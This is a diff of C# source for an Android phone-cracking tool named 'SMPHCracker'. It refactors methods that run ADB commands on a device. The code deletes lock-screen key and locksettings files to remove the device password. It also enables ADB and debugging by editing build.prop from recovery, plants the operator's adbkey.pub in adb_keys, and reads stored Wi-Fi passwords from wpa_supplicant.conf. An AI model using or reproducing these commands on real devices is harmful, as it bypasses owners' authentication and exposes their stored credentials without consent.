@@ -8,11 +8,12 @@ using System.Threading.Tasks;
 
 namespace SMPHCracker.Logic
 {
+    //TODO - check successfuly operation
     class Cracker : ICracker
     {
         public Status GetStatus()
         {
-            String output = ADB.Devices();
+            String output = ADB.Execute(ADBCommands.DEVICES);
 
             output = String.IsNullOrWhiteSpace(output) ? String.Empty : string.Join(" ", Regex.Split(output, @"(?:\r\n|\n|\r|\t)")).Split(' ')[5];
 
@@ -22,6 +23,7 @@ namespace SMPHCracker.Logic
                     return Status.Unauthorized;
 
                 case "device":
+                    //TODO - change to ADB.Execute(SHELLROOT) after SHELL-ROOT fix
                     output = ADB.Shell("TestSu", true);
 
                     if(output.Contains("error") || output.Contains("denied"))
@@ -37,42 +39,42 @@ namespace SMPHCracker.Logic
 
                 default:
                     return Status.NoDevice;
-
             }
         }
 
         public string GetBezeichnung()
         {
-            return ADB.GetName();
+            return $"{ADB.Execute(ADBCommands.GETPROP, "ro.product.brand")} {ADB.Execute(ADBCommands.GETPROP, "ro.product.model")}";
         }
 
-        //ShellSu
         public bool RemovePassoword(Status status)
         {
-            if (status == Status.Root || status == Status.Recovery)
+            switch (status)
             {
-                bool root = false;
+                case Status.Root:
+                    //TODO - FIX SHELL-ROOT!
+                    return false;
+                    ADB.Execute(ADBCommands.SHELLROOT, "mount data");
+                    //Remove LockScreen
+                    ADB.Execute(ADBCommands.SHELLROOT, "rm /data/system/*.key");
+                    //Reset LockSettings
+                    ADB.Execute(ADBCommands.SHELLROOT, "rm /data/system/locksettings*");
+                    return true;
 
-                if (status == Status.Root)
-                    root = true;
+                case Status.Recovery:
+                    ADB.Execute(ADBCommands.SHELL, "mount data");
+                    //Remove LockScreen
+                    ADB.Execute(ADBCommands.SHELL, "rm /data/system/*.key");
+                    //Reset LockSettings
+                    ADB.Execute(ADBCommands.SHELL, "rm /data/system/locksettings*");
+                    return true;
 
-                ADB.Shell("mount data", root);
+                case Status.Sideload:
+                    return RemovePasswordSideload();
 
-                //Remove LockScreen
-                ADB.Shell("rm /data/system/*.key", root);
-
-                //Reset LockSettings
-                ADB.Shell("rm /data/system/locksettings*", root);
-
-                return true;
+                default:
+                    return false;
             }
-            else if (status == Status.Sideload)
-            {
-                return RemovePasswordSideload();
-            }
-
-            return false;
-            //Needs Reboot
         }
         private bool RemovePasswordSideload()
         {
@@ -82,44 +84,42 @@ namespace SMPHCracker.Logic
         //Recovery-Shell-Mode
         public bool EnableADB(Status status)
         {
-            if (status == Status.Recovery)
+            switch (status)
             {
-                //May not work because no Shell (o. Shell-SU) in Recovery!
-                //No root because Recovery-Mode!
+                case Status.Recovery:
+                    //Add ADB-Settings
+                    ADB.Execute(ADBCommands.SHELL, "mount data");
+                    ADB.Execute(ADBCommands.SHELL, "\"echo -n 'mtp,adb' > /data/property/persist.sys.usb.config\"");
+                    //Activates ADB-Settings
+                    ADB.Execute(ADBCommands.SHELL, "mount system");
+                    ADB.Execute(ADBCommands.SHELL, "\"echo '' >> /system/build.prop\"");
+                    ADB.Execute(ADBCommands.SHELL, "\"echo '# Enable ADB\' >> /system/build.prop\"");
+                    ADB.Execute(ADBCommands.SHELL, "\"echo 'persist.service.ADB.enable=1' >> /system/build.prop\"");
+                    ADB.Execute(ADBCommands.SHELL, "\"echo 'persist.service.debuggable=1' >> /system/build.prop\"");
+                    ADB.Execute(ADBCommands.SHELL, "\"echo 'persist.sys.usb.config=mtp,adb' >> /system/build.prop\"");
 
-                //Add ADB-Settings
-                ADB.Shell("mount data", false);
-                ADB.Shell("\"echo -n 'mtp,adb' > /data/property/persist.sys.usb.config\"", false);
+                    return true;
 
-                //Activates ADB-Settings
-                ADB.Shell("mount system", false);
-                ADB.Shell("\"echo '' >> /system/build.prop\"", false);
-                ADB.Shell("\"echo '# Enable ADB\' >> /system/build.prop\"", false);
-                ADB.Shell("\"echo 'persist.service.ADB.enable=1' >> /system/build.prop\"", false);
-                ADB.Shell("\"echo 'persist.service.debuggable=1' >> /system/build.prop\"", false);
-                ADB.Shell("\"echo 'persist.sys.usb.config=mtp,adb' >> /system/build.prop\"", false);
+                case Status.Sideload:
+                    return EnableADBSideload();
 
-                return true;
+                default:
+                    return false;
             }
-            else if(status == Status.Sideload)
-            {
-                return EnableADBSideload();
-            }
-
-            return false;
         }
         private bool EnableADBSideload()
         {
             return false;
         }
 
-        //ADB-SU Mode
         public bool VerifyADB(Status status)
         {
             if (status == Status.Recovery)
             {
+                //TODO - get adkey.pub from folder .android
+
                 //Vertify PC for ADB
-                ADB.Push(@"C:\Users\ErdnüßFrederic\.android\adbkey.pub", "/data/misc/adb/adb_keys");
+                ADB.Execute(ADBCommands.PUSH, @"C:\Users\ErdnüßFrederic\.android\adbkey.pub", "/data/misc/adb/adb_keys");
 
                 return true;
             }
@@ -137,13 +137,21 @@ namespace SMPHCracker.Logic
 
         public string ShowWLANKeys(Status status)
         {
-            if (status == Status.Root || status == Status.Recovery)
+            switch (status)
             {
-                //Show WLAN-Keys 
-                return ADB.Shell("cat /data/misc/wifi/wpa_supplicant.conf", true);
-            }
+                case Status.Root:
+                    //TODO - FIX SHELL-SU!
+                    return "false";
+                    //Show WLAN-Keys
+                    return ADB.Execute(ADBCommands.SHELLROOT, "cat /data/misc/wifi/wpa_supplicant.conf");
 
-            return "false";
+                case Status.Recovery:
+                    //Show WLAN-Keys
+                    return ADB.Execute(ADBCommands.SHELL, "cat /data/misc/wifi/wpa_supplicant.conf");
+
+                default:
+                    return "false";
+            }
         }
     }
 }
